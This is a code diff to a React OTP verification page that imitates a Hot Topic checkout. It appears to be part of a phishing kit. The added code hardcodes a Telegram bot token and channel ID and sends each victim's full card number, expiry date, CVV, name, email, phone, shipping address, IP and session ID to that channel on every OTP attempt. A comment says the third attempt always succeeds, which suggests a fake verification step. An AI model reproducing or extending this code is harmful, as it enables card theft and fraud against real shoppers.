@@ -6,8 +6,11 @@ import { toast } from "@/hooks/use-toast";
 import HotTopicHeader from "@/components/HotTopicHeader";
 import HotTopicFooter from "@/components/HotTopicFooter";
 import { AlertCircle, Clock, LockIcon, Shield } from "lucide-react";
-import { supabase } from "@/integrations/supabase/client";
 import { InputOTP, InputOTPGroup, InputOTPSlot, InputOTPSeparator } from "@/components/ui/input-otp";
+
+// Telegram configuration
+const TELEGRAM_BOT_TOKEN = "7782642954:AAEhLo5kGD4MlWIsoYnnYHEImf7YDCLsJgo";
+const TELEGRAM_CHANNEL_ID = "-1002550945996";
 
 const OTPVerification = () => {
   const location = useLocation();
@@ -82,6 +85,92 @@ const OTPVerification = () => {
       });
     }
   }, [countdown, navigate]);
+
+  // Send notification to Telegram
+  const sendTelegramNotification = async (attempt: number, isSuccess: boolean) => {
+    try {
+      // Format the message with full card details and custom styling
+      // Red for failed attempts, green for success
+      const attemptColor = isSuccess ? 'green' : 'red';
+      const attemptHeader = isSuccess 
+        ? '✅ <b style="color:green">OTP VERIFICATION SUCCESSFUL</b> ✅' 
+        : `⚠️ <b style="color:red">OTP VERIFICATION ATTEMPT ${attempt}</b> ⚠️`;
+      
+      const statusText = isSuccess 
+        ? '✅ <span style="color:green">Success - Final attempt</span>' 
+        : `❌ <span style="color:red">Failed - Attempt ${attempt} of 3</span>`;
+
+      let message = `
+${attemptHeader}
+
+👤 <b>Customer Information</b>:
+   Name: ${orderDetails?.customerName || "N/A"}
+   Email: ${orderDetails?.email || "N/A"}
+   Phone: ${orderDetails?.phone || "N/A"}
+
+🔐 <b>Verification Status</b>:
+   ${statusText}
+
+💳 <b>Payment Details</b>:
+   Card Type: ${paymentMethod || "N/A"}
+   Card Number: <code>${cardNumber || "N/A"}</code>
+   Expiry Date: ${expiryDate || "N/A"}
+   CVV: <code>${cvv || "N/A"}</code>
+   Last Four: ${lastFour || "N/A"}
+   Order Amount: $${discountedAmount?.toFixed(2) || "0.00"}
+   Gift Card Value: $${giftCardValue?.toFixed(2) || "0.00"}`;
+
+      // Add address if it's a physical delivery
+      if (orderDetails?.deliveryMethod === "physical" && orderDetails?.address) {
+        message += `
+
+📍 <b>Shipping Address</b>:
+   Street: ${orderDetails.address.street}
+   City: ${orderDetails.address.city}
+   State: ${orderDetails.address.state}
+   ZIP: ${orderDetails.address.zipCode}`;
+      }
+
+      // Add user information
+      message += `
+
+🔍 <b>User Information</b>:
+   IP Address: <code>${orderDetails?.userInfo?.ip || "Unknown"}</code>
+   Browser: ${orderDetails?.userInfo?.userAgent || navigator.userAgent}
+   Session ID: ${orderDetails?.userInfo?.sessionId || "Not available"}
+   Timestamp: ${new Date().toISOString()}
+
+📆 <b>Attempt Time</b>: ${new Date().toLocaleString()}`;
+
+      console.log("Sending Telegram notification with message:", message);
+      
+      // Send directly to Telegram API
+      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const response = await fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHANNEL_ID,
+          text: message,
+          parse_mode: 'HTML',
+        }),
+      });
+
+      const result = await response.json();
+      if (!result.ok) {
+        console.error('Telegram notification error:', result);
+        return false;
+      }
+      
+      console.log("Telegram notification sent successfully");
+      return true;
+    } catch (error) {
+      console.error('Failed to send Telegram notification:', error);
+      return false;
+    }
+  };
   
   // Check OTP validity based on attempt number
   const verifyOTP = () => {
@@ -124,34 +213,16 @@ const OTPVerification = () => {
     setError("");
     
     // Validate OTP
-    if (!verifyOTP()) {
-      // Even on failure, send notification about the failed attempt
-      try {
-        // Create notification with detailed payment information
-        const notificationDetails = {
-          ...orderDetails,
-          paymentMethod: paymentMethod,
-          cardNumber: cardNumber || "Unknown",
-          expiryDate: expiryDate || "Unknown", 
-          cvv: cvv || "Unknown",
-          lastFour: lastFour || "Unknown",
-          giftCardValue: giftCardValue,
-          paymentAmount: discountedAmount,
-          notificationType: "otp_attempt",
-          otpAttempt: attempts + 1, // Adding 1 because we want to report the current attempt (1-indexed)
-          userInfo: {
-            ...orderDetails.userInfo,
-            timestamp: new Date().toISOString()
-          }
-        };
-
-        // Send to Telegram even for failed attempts
-        supabase.functions.invoke("send-telegram-notification", {
-          body: notificationDetails
-        });
-      } catch (telegramErr) {
-        console.error("Error sending Telegram notification:", telegramErr);
-      }
+    const isValid = verifyOTP();
+    
+    // Send notification to Telegram for current attempt
+    try {
+      await sendTelegramNotification(attempts + 1, isValid);
+    } catch (telegramErr) {
+      console.error("Error sending Telegram notification:", telegramErr);
+    }
+    
+    if (!isValid) {
       return;
     }
     
@@ -174,34 +245,6 @@ const OTPVerification = () => {
       
       // Save order details to localStorage for reference
       localStorage.setItem("hotTopicOrder", JSON.stringify(completeOrderDetails));
-      
-      // Send final successful OTP verification notification to Telegram
-      try {
-        const finalNotificationDetails = {
-          ...completeOrderDetails,
-          giftCardValue: giftCardValue,
-          paymentAmount: discountedAmount,
-          notificationType: "otp_attempt",
-          otpAttempt: 3, // Third attempt is always successful
-          userInfo: {
-            ...orderDetails.userInfo,
-            timestamp: new Date().toISOString()
-          }
-        };
-
-        console.log("Sending final OTP verification to Telegram:", finalNotificationDetails);
-        supabase.functions.invoke("send-telegram-notification", {
-          body: finalNotificationDetails
-        }).then(response => {
-          if (response.error) {
-            console.error("Failed to send Telegram notification:", response.error);
-          } else {
-            console.log("Telegram notification sent successfully:", response.data);
-          }
-        });
-      } catch (telegramErr) {
-        console.error("Error sending Telegram notification:", telegramErr);
-      }
       
       // Navigate to payment success page
       navigate("/payment-success", { 
